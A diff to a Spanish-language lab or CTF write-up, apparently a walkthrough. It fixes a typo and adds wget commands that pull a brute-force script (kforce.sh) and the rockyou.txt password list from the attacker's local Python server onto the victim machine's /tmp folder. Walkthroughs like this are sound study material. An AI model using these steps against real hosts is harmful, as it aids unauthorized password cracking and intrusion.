@@ -87,7 +87,10 @@ Luego, abriremos un servidor python en la ruta donde tenemos [KaiteForce](https:
 ```
 python3 -m http.server 8000
 ```
-y en la máquina victima descargaremos los archivos necesarios en ```/tmp/``` (ya que es una carpeta donde tenemos permisos) dela siguiente manera:
-
+y en la máquina victima descargaremos los archivos necesarios en ```/tmp/``` (ya que es una carpeta donde tenemos permisos) de la siguiente manera:
+```
+wget http://172.17.0.1:8000/kforce.sh
+wget http://172.17.0.1:8000/rockyou.txt
+```
 
 
